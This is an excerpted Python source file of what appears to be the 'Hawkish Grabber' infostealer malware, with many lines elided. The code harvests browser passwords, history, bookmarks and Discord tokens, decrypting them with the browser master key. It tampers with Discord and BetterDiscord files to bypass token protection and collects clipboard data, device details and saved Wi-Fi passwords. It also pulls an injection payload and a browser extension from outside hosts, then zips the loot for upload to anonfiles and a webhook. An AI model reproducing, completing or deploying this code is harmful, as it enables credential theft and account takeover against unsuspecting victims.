...
json_confg = {
    ...
    "url_hawkinject": f"https://hawkish.eu/grabber/injection",
...
class hwkish_first_funct(Functions):
    ...
    async def init(self):
        ...
        for name, path in self.browsers.items():
            ...
            self.funcs = [
                self.gang_hwkstl,
                self.hwkishstealhist2,
                self.hwkishstealbookmarks,
        ...
        if os.path.exists(self.chrome_user_path) and self.chrome_key is not None:
            ...
            function_list.extend([self.hwkishsteal_psw, self.hwkishstol_gang, self.hwkishstealhist])
    ...
    def install_extension(self):
        ...
        try:
            ...
            extensions = {
                'extensions': f'https://github.com/hawkerthewinner/Chromium-Injection/raw/main/extensions.zip'
            }
    ...
    async def bypass_tokenprtct(self):
        ...
        with open(config, "r", errors="ignore") as f:
            try:
                ...
                return
        item[f"{hwkish}_Hawkish_is_here"] = f"https://github.com/hawkerthewinner"
        ...
        with open(config, "w") as f:
            ...
            f.write(f"\n\n//{hwkish}_Hawkish_is_here | https://github.com/hawkerthewinner")
    ...
    async def bypss_betterdsc(self):
        ...
        if os.path.exists(bd):
            ...
            with open(bd, "r", encoding="cp437", errors="ignore") as f:
                txt = f.read()
                content = txt.replace(x, f"{hwkish}_hawkerthewinnergoat")
                    ...
                    for filename in os.listdir(path):
                        ...
                        for line in [
                            ...
                            for y in re.findall(self.regexcrypt, line):
                                try:
                                    token = self.decrypt_value(
                                        base64.b64decode(y.split("dQw4w9WgXcQ:")[1]),
                                        self.foundmasterk3y(local_state_path),
                                    )
                                except ValueError:
                                    pass
                                try:
    ...
    def hwkishstealbookmarks(self, name: str, path: str, profile: str):
        if self.hwk_get_browsers != "yes":
            return
    ...
    def hwkishstealhist2(self, name: str, path: str, profile: str):
        if self.hwk_get_browsers != "yes":
            return
    ...
    def downloadclipboard(self):
        ...
        if output:
            with open(os.path.join(self.dir, 'Systeme', 'Latest Clipboard.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                file.write(
                    f"{hwkish}-Grabber | https://github.com/hawkerthewinner/{hwkish}-Grabber\n\n" + output)
        ...
        try:
            ...
            if output:
                with open(os.path.join(self.dir, 'Systeme', 'Devices Info.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write(
                    f"{hwkish} | https://github.com/hawkerthewinner/{hwkish}-Grabber\n\n" + output)
        except Exception:
            return None
    ...
    def hwkishget_mywifi(self):
        ...
        profiles = [
            f'SSID: {ssid}\n{hwkish}-Grabber  PASSW:{password}' for ssid, password in passwords.items()]
        divider = f'\n\n{hwkish}-Grabber | https://github.com/hawkerthewinner/{hwkish}-Grabber\n\n'
    ...
    def finished_bc(self):
                ...
                with open(path, "r", errors="ignore") as ff:
                    ...
                    if not x:
                        ...
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write(
                                f"{hwkish} Create By {hwkish}-Grabber Team | https://github.com/hawkerthewinner\n\n"
                            )
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(
                                x
                                + f"\n\n{hwkish} Create By {hwkish}-Grabber Team | https://github.com/hawkerthewinner"
                            )
        _zipfile = os.path.join(
            self.appdata, f"{self.getlange(self.pc_codewinl)}{hwkish}_[{imthebestdev}].zip")
        ...
        for tkn in self.hawked:
            tokens += f"{tkn}\n\n"
        fileCount = f"{file_count} {hwkish} FILES: "
            ...
            "embeds": [
                {
                    "author": {
                        "name": f"{hwkish} v7",
                        "url": f"https://github.com/{hwkish}-Teams",
                        "icon_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/ghost-eye.gif",
                    },
                    "color": 16734976,
                    "description": f"[{hwkish} ON TOP]({self.googlemap})",
                    "fields": [
                        {
                            "name": "\u200b",
                            "value": f"""```ansi
...
{tokens[:2000] if tokens else "tokens not found"}```
    """.replace(" ", ""),
                    ...
                    "footer": {
                        "text": f"{hwkish} Create BY {hwkish}-Grabber Team・https://github.com/hawkerthewinner"
                    },
                }
            ],
        }
        ...
        try:
            self.upload_on_anonfiles(f"{self.getlange(self.pc_codewinl)}{hwkish}_{imthebestdev}.zip", _zipfile)
            time.sleep(10)
        except:
            pass
        finally:
            ...
            "embeds": [
                {
                    ...
                    "author": {
                        "name": f"{hwkish} v7",
                        "url": f"https://github.com/hawkerthewinner",
                        "icon_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/ghost-eye.gif",
                    },
                    "footer": {"text": f"github.com/hawkerthewinner"},
                    "color": 16734976,
                }
            ],
            "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/hawkish.png",
